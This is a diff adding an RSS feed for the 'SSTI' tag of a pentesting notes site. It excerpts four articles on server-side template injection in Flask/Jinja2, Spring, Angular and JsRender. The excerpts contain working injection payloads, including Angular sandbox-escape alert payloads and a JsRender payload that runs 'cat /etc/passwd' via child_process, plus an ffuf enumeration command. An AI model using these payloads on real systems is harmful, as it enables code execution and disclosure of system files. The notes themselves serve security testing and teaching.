@@ -1,0 +1,40 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>SSTI on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/tags/ssti/</link>
+    <description>Recent content in SSTI on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Fri, 22 Sep 2023 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/tags/ssti/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Flask Jinja2 Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/framework/python/flask-jinja2-pentesting/</link>
+      <pubDate>Fri, 22 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/flask-jinja2-pentesting/</guid>
+      <description>Common Directories link /app.py /main.py /modules.py /modules/__init__.py /modules/admin.py SSTI (Server-Side Template Injection) linkSometimes, website may filter specific characters.&#xA;If so, URL encode the payload or convert to HEX.&#xA;In addition, it’s recommended to send requests using Burp Suite because web browsers automatically update the payload.&#xA;First, try below payloads.&#xA;{{ 4*2 }} {{ config.items() }} # Remove curly brackets {2*3} 2*3 RCE linkIf success, we may be able to exploit with OS command injection.</description>
+    </item>
+    <item>
+      <title>Spring Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/framework/java/spring-pentesting/</link>
+      <pubDate>Fri, 15 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/framework/java/spring-pentesting/</guid>
+      <description>Framework Detection linkIf we get the Whitelabel Error Page, the website may use Spring Boot.&#xA;Enumeration linkDirectory Discovery link ffuf -u https://example.com/FUZZ -w seclists/Discovery/Web-Content/spring-boot.txt SSTI linkDiscovery linkIf there is an input form, such as a search form, or URL parameter which the parameter is reflected in the website, you may be able to find the vulnerability to the server-side template injection.&#xA;Try them:&#xA;2*2 #{2*2} *{2*2} Then you can also check more about that.</description>
+    </item>
+    <item>
+      <title>Angular Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/framework/javascript/angular-pentesting/</link>
+      <pubDate>Wed, 12 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/framework/javascript/angular-pentesting/</guid>
+      <description>HTML Attributes linkIf a website uses AngularJS framework, the nodes have a “ng-apps” attribute. So you can check it in a HTML source code.&#xA;&amp;lt;div ng-apps&amp;gt; Server-Side Template Injection (SSTI) link {{2*3}} {{$on.constructor(&amp;#39;alert(&amp;#34;test&amp;#34;)&amp;#39;)()}} {{constructor.constructor(&amp;#39;alert(&amp;#34;test&amp;#34;)&amp;#39;)()}} &amp;lt;input ng-focus=$event.view.alert(&amp;#39;test&amp;#39;)&amp;gt; &amp;lt;div ng-app ng-csp&amp;gt;&amp;lt;textarea autofocus ng-focus=&amp;#34;d=$event.view.document;d.location.hash.match(&amp;#39;x1&amp;#39;) ? &amp;#39;&amp;#39; : d.location=&amp;#39;//localhost/mH/&amp;#39;&amp;#34;&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;/div&amp;gt; It worth testing to bypass sanitizing as below.&#xA;# Remove one-pair braces {2*3} # Remove all braces 2*3 # Add additional braces {{{2*3}}} </description>
+    </item>
+    <item>
+      <title>JsRender Template Injection</title>
+      <link>https://documentnation.github.io/docs/hdks/web/template-engine/jsrender-template-injection/</link>
+      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/template-engine/jsrender-template-injection/</guid>
+      <description>Investigation linkTry to insert arbitrary code into double curly brackets. If the result of the code is reflected in the page, we can inject malicious code in the template.&#xA;{{:2*3}} {{:&amp;#34;test&amp;#34;.toString}} Exploitation link # XSS {{:&amp;#34;test&amp;#34;.toString.constructor.call({},&amp;#34;alert(1)&amp;#34;)}} # Read local files {{:&amp;#34;test&amp;#34;.toString.constructor.call({},&amp;#34;return global.process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;cat /etc/passwd&amp;#39;).toString()&amp;#34;)()}} </description>
+    </item>
+  </channel>
+</rss>
